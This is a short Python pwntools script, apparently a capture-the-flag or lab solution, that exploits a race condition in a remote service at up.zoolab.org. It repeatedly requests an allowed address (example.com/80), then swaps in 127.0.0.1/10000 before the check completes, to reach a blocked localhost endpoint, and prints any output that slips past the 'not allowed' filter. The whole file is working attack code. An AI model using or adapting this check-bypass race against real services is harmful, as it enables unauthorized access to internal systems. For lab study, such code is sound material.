from pwn import *
import time



def exploit():
    for i in range (100):
        conn = remote('up.zoolab.org', 10932)
        conn.sendline('g')
        conn.sendline('example.com/80')
        #time.sleep(0.00001)
        conn.sendline('g')
        conn.sendline('127.0.0.1/10000')
        time.sleep(0.1)
        conn.sendline('v')
        
        conn.sendline('q')
        data = conn.recvall()
        if "not allowed" not in str(data):
            for i in str(data).split("\\n"):
                print(i)

exploit()
